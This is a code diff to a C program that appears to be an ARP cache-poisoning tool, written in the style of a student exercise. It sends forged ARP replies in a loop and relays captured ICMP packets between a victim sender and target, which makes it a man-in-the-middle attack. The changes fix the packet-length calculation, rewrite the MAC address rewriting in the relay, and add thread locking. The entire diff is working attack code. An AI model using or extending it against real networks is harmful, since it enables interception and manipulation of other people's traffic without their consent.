@@ -22,7 +22,6 @@
 #define MAX_PACKET 65536
 
 pthread_t *threads;
-__thread byte tg_packet[MAX_PACKET];
 pthread_mutex_t  gmutex = PTHREAD_MUTEX_INITIALIZER; //sync
 pthread_cond_t gcond = PTHREAD_COND_INITIALIZER;
 
@@ -179,8 +178,10 @@ arp_infection (
 	pthread_mutex_lock(&gmutex);
 	printf("The thread continues to send infect arp reply....\n");
 	send_arp(handle, &eh, &ah, &ad);
+
 	pthread_cond_signal(&gcond);
 	pthread_mutex_unlock(&gmutex);
+
 	sleep(3);
     }
 }
@@ -191,16 +192,15 @@ arp_infection (
  *  packet relay between sender and target.
  */
 
-#define Packet_Len(x)	(((pipv4_hdr)x)->ip_len)+14
+#define Packet_Len(x)	ntohs(((pipv4_hdr)x)->ip_len)+14
 #define Filter		"icmp"
 
 int
 packet_relay (
 	pcap_t *handle,
-	p_addr_list my_al
+	p_addr_list s_al,
+	p_addr_list t_al
 ) {
-    //ether_hdr eh;
-
     struct bpf_program fp;		    /* The compiled filter */
     byte filter_exp[] = Filter;		    /* The fileter expression */
     bpf_u_int32 net = 0;		    /* Our IP */
@@ -221,6 +221,7 @@ packet_relay (
     
     while(1) {
 	puts("MITM...");
+	pthread_mutex_lock(&gmutex);
 	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
 	    packet_ptr = packet;
 
@@ -231,36 +232,30 @@ packet_relay (
 		if(((pipv4_hdr)packet_ptr)->ip_p == IPPROTO_ICMP) {
 		    total_len = Packet_Len(packet_ptr);
 		    header_len += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
-		    packet_ptr += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
 
-		    /*
-		    if(((ptcp_hdr)packet_ptr)->th_dport == 80) {
-			header_len += ((((ptcp_hdr)packet_ptr)->th_off)*4);
-			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
-	
-			// relay to target from sender
-			memcpy(tg_packet, packet, total_len);
-			memcpy(&(((pether_hdr)tg_packet)->ether_shost), 
-				my_al->mac, 
-				ETHER_ADDR_LEN);
+		    if(!memcmp(
+			    (BYTE*)(ether_aton((byte*)s_al->mac)), 
+			    (BYTE*)((pether_hdr)packet)->ether_shost,
+			    6)) {
+			    memcpy(
+				    (BYTE*)((pether_hdr)packet)->ether_dhost, 
+				    (BYTE*)(ether_aton((byte*)t_al->mac)), 
+				    6);
+		    } else {
+			    memcpy(
+				    (BYTE*)((pether_hdr)packet)->ether_dhost, 
+				    (BYTE*)(ether_aton((byte*)s_al->mac)), 
+				    6);
+		    }
 
-			dumpcode(tg_packet+header_len, total_len-header_len);
-			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
-		    } else if(((ptcp_hdr)packet_ptr)->th_sport == 80) {
-			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
-
-			// relay to sender from target
-			memcpy(tg_packet, packet, total_len);
-			memcpy(&(((pether_hdr)tg_packet)->ether_dhost), 
-				my_al->mac, 
-				ETHER_ADDR_LEN);
-
-			dumpcode(tg_packet+header_len, total_len-header_len);
-			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
-		    } else continue; */
+		    dumpcode((BYTE*)packet, total_len);
+		    if(pcap_sendpacket(handle, (BYTE*)packet, total_len)<0)
+			puts("Failed...");
 		}
 	    }
 	}
+	pthread_cond_signal(&gcond);
+	pthread_mutex_unlock(&gmutex);
     }
 
     return 1;
@@ -436,7 +431,6 @@ main (
     addr_list my_al;			/* My Linked List */
     char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */
     thr_arg *p_ta;			/* Thread Arguments */
-    int status;				/* Trhead process result */
 
     if((argc <= 4) && ((argc%2) != 0)) {
         fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip> [<sender ip> <target ip>...]\n", argv[0]);
@@ -489,7 +483,7 @@ main (
      
     pthread_cond_wait(&gcond, &gmutex); //block
     pthread_mutex_unlock(&gmutex);
-    packet_relay(handle, &my_al);
+    packet_relay(handle, s_al, t_al);
 
     /* And close the session */
     pcap_close(handle);
